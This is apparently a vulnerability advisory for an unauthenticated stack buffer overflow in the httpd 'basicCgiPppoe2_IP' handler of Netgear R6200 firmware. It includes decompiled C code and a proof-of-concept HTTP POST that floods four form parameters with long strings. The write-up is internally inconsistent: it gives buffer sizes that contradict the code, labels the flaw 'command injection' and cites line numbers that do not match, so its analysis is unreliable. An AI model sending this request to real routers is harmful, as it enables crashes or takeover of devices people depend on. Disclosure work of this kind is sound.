# Buffer Overflow Vulnerability in `basicCgiPppoe2_IP`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | Netgear R6200 Router                                         |
| Firmware Version     | V1.0.1.58_1.0.44                                             |
| Vulnerability Type   | **Buffer Overflow**                                          |
| Vulnerable Component | `httpd` (`basicCgiPppoe2_IP`) (multiple vulnerable buffers: `v10`, `v7`, `v8`, `v9`, `v11`) |
| Prerequisites        | No authentication required; attacker must supply crafted input via web interface parameters `tempIP`, `endIP4`, `Protocol`, `policyIndex` |

2. Exploitation Path

```c
int __fastcall basicCgiPppoe2_IP(char *a1, int a2)
{
  char *v4; // $v0
  int v5; // $v0
  char v7[8]; // [sp+18h] [-138h] BYREF
  char v8[8]; // [sp+20h] [-130h] BYREF
  char v9[8]; // [sp+28h] [-128h] BYREF
  char v10[32]; // [sp+30h] [-120h] BYREF
  char v11[256]; // [sp+50h] [-100h] BYREF

  memset(v10, 0, sizeof(v10));
  memset(v11, 0, sizeof(v11));
  v7[0] = 0;
  v8[0] = 0;
  v7[1] = 0;
  v7[2] = 0;
  v7[3] = 0;
  v7[4] = 0;
  v7[5] = 0;
  v7[6] = 0;
  v7[7] = 0;
  v8[1] = 0;
  v8[2] = 0;
  v8[3] = 0;
  v8[4] = 0;
  v8[5] = 0;
  v8[6] = 0;
  v8[7] = 0;
  websGetVar(a1, "tempIP", v10);
  strcpy(v11, v10);
  v4 = &v11[strlen(v11)];
  v4[1] = 0;
  *v4 = 45;
  websGetVar(a1, "endIP4", v7);
  strcat(v11, v7);
  websGetVar(a1, "Protocol", v8);
  strcat(v11, ",");
  strcat(v11, v8);
  websGetVar(a1, "policyIndex", v9);
  if ( v9[0] )
  {
    v5 = atoi(v9);
    sub_42AB90(v11, v5);
  }
  else
  {
    sub_42AB90(v11, 0);
  }
  sendPage2Client("BAS_basic.htm", a2);
  return 0;
}
```

3. **Vulnerable Binaries:** The vulnerability resides in the `httpd` binary.

4. 0-Day Command Injection Exploitation Path: Multiple buffer overflow vulnerabilities are present in the `basicCgiPppoe2_IP` function:
   - At line 29, `websGetVar(a1, "tempIP", v10)` receives input into the destination buffer `v10`, which has a size of 32 bytes. Although `websGetVar` enforces a 255-byte length limit, no further validation is applied, resulting in a buffer overflow.
   - At line 34, `websGetVar(a1, "endIP4", v7)` receives input into the destination buffer `v7` (32 bytes). The 255-byte input limit is applied by `websGetVar`, but no additional validation exists, leading to a buffer overflow.
   - At line 36, `websGetVar(a1, "Protocol", v8)` receives input into the destination buffer `v8` (32 bytes). Similarly, the 255-byte limit is enforced, but no further validation is applied, resulting in a buffer overflow.
   - At line 39, `websGetVar(a1, "policyIndex", v9)` receives input into the destination buffer `v9` (32 bytes), with the same lack of additional validation, causing a buffer overflow.
   - At line 38, `strcat(v11, v8)` operates on the destination buffer `v11` (256 bytes). Following the concatenation at line 35 `strcat(v11, v7)` and line 37 `strcat(v11, ",")`, this sequence may lead to a buffer overflow due to insufficient bounds checking.

5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/basicCgiPppoe2_IP HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 1024
Connection: close

tempIP=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&endIP4=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
&Protocol=CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
&policyIndex=DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
```